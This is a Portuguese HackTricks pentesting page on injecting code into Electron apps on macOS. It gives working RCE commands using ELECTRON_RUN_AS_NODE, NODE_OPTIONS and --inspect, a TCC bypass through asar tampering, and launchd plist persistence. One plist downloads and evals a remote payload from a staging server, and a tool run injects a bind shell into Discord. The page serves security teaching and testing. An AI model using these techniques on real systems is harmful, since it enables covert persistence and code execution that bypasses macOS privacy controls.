# Injeção em Aplicações Electron no macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações Básicas

Se você não sabe o que é Electron, você pode encontrar [**muitas informações aqui**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Mas por enquanto, saiba apenas que o Electron executa o **node**.\
E o node possui alguns **parâmetros** e **variáveis de ambiente** que podem ser usados para **executar outro código** além do arquivo indicado.

### Fusíveis do Electron

Essas técnicas serão discutidas a seguir, mas recentemente o Electron adicionou várias **flags de segurança para evitá-las**. Esses são os [**Fusíveis do Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e estes são os usados para **prevenir** que aplicativos Electron no macOS **carreguem código arbitrário**:

* **`RunAsNode`**: Se desativado, impede o uso da variável de ambiente **`ELECTRON_RUN_AS_NODE`** para injetar código.
* **`EnableNodeCliInspectArguments`**: Se desativado, parâmetros como `--inspect`, `--inspect-brk` não serão respeitados. Evitando assim a injeção de código dessa forma.
* **`EnableEmbeddedAsarIntegrityValidation`**: Se ativado, o arquivo **`asar`** carregado será validado pelo macOS. **Prevenindo** dessa forma a **injeção de código** ao modificar o conteúdo deste arquivo.
* **`OnlyLoadAppFromAsar`**: Se isso estiver ativado, em vez de procurar para carregar na seguinte ordem: **`app.asar`**, **`app`** e finalmente **`default_app.asar`**. Ele só verificará e usará app.asar, garantindo assim que, quando **combinado** com o fusível **`embeddedAsarIntegrityValidation`**, seja **impossível** carregar código não validado.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Se ativado, o processo do navegador usa o arquivo chamado `browser_v8_context_snapshot.bin` para seu snapshot V8.

Outro fusível interessante que não impedirá a injeção de código é:

* **EnableCookieEncryption**: Se ativado, o armazenamento de cookies no disco é criptografado usando chaves de criptografia em nível de sistema operacional.

### Verificando os Fusíveis do Electron

Você pode **verificar essas flags** de um aplicativo com:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificando os Fusíveis do Electron

Conforme mencionado na [**documentação**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), a configuração dos **Fusíveis do Electron** é feita dentro do **binário do Electron**, que contém em algum lugar a string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Nos aplicativos do macOS, isso geralmente está localizado em `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Você pode carregar este arquivo em [https://hexed.it/](https://hexed.it/) e procurar pela string anterior. Após essa string, você pode ver em ASCII um número "0" ou "1" indicando se cada fusível está desabilitado ou habilitado. Basta modificar o código hexadecimal (`0x30` é `0` e `0x31` é `1`) para **modificar os valores dos fusíveis**.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Observe que se você tentar **sobrescrever** o **binário do Electron Framework** dentro de um aplicativo com esses bytes modificados, o aplicativo não será executado.

## RCE adicionando código a Aplicações Electron

Pode haver **arquivos JS/HTML externos** que um aplicativo Electron está usando, então um invasor pode injetar código nesses arquivos cuja assinatura não será verificada e executar código arbitrário no contexto do aplicativo.

{% hint style="danger" %}
No entanto, no momento existem 2 limitações:

* A permissão **`kTCCServiceSystemPolicyAppBundles`** é **necessária** para modificar um aplicativo, portanto, por padrão, isso não é mais possível.
* O arquivo compilado **`asap`** geralmente tem os fusíveis **`embeddedAsarIntegrityValidation`** `e` **`onlyLoadAppFromAsar`** `habilitados`

Tornando esse caminho de ataque mais complicado (ou impossível).
{% endhint %}

Observe que é possível contornar o requisito de **`kTCCServiceSystemPolicyAppBundles`** copiando o aplicativo para outro diretório (como **`/tmp`**), renomeando a pasta **`app.app/Contents`** para **`app.app/NotCon`**, **modificando** o arquivo **asar** com seu código **malicioso**, renomeando-o de volta para **`app.app/Contents`** e executando-o.

## RCE com `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

De acordo com [**a documentação**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), se essa variável de ambiente estiver definida, ela iniciará o processo como um processo Node.js normal.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se o fusível **`RunAsNode`** estiver desativado, a variável de ambiente **`ELECTRON_RUN_AS_NODE`** será ignorada e isso não funcionará.
{% endhint %}

### Injeção a partir do App Plist

Conforme [**proposto aqui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), você pode abusar dessa variável de ambiente em um plist para manter a persistência:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE com `NODE_OPTIONS`

Você pode armazenar a carga útil em um arquivo diferente e executá-lo:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Se o fusível **`EnableNodeOptionsEnvironmentVariable`** estiver **desativado**, o aplicativo **ignorará** a variável de ambiente **NODE\_OPTIONS** ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** seja definida, o que também será **ignorado** se o fusível **`RunAsNode`** estiver desativado.
{% endhint %}

### Injeção a partir do App Plist

Você pode abusar dessa variável de ambiente em um plist para manter a persistência adicionando estas chaves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE com inspeção

De acordo com [**este**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) artigo, se você executar um aplicativo Electron com flags como **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, uma **porta de depuração será aberta** para que você possa se conectar a ela (por exemplo, pelo Chrome em `chrome://inspect`) e você poderá **injetar código nela** ou até mesmo iniciar novos processos.\
Por exemplo:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se o fusível **`EnableNodeCliInspectArguments`** estiver desativado, o aplicativo **ignorará os parâmetros do node** (como `--inspect`) ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** seja definida, o que também será **ignorado** se o fusível **`RunAsNode`** estiver desativado.

No entanto, ainda é possível usar o parâmetro do electron `--remote-debugging-port=9229`, mas a carga útil anterior não funcionará para executar outros processos.
{% endhint %}

### Injeção a partir do App Plist

Você pode abusar dessa variável de ambiente em um plist para manter a persistência adicionando estas chaves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypassando o TCC abusando de versões antigas

{% hint style="success" %}
O daemon TCC do macOS não verifica a versão executada do aplicativo. Portanto, se você **não consegue injetar código em um aplicativo Electron** com nenhuma das técnicas anteriores, você pode baixar uma versão anterior do aplicativo e injetar código nele, pois ele ainda obterá os privilégios do TCC.
{% endhint %}

## Injeção Automática

A ferramenta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) pode ser facilmente usada para **encontrar aplicativos Electron vulneráveis** instalados e injetar código neles. Essa ferramenta tentará usar a técnica **`--inspect`**:

Você precisa compilá-la por conta própria e pode usá-la da seguinte maneira:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referências

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
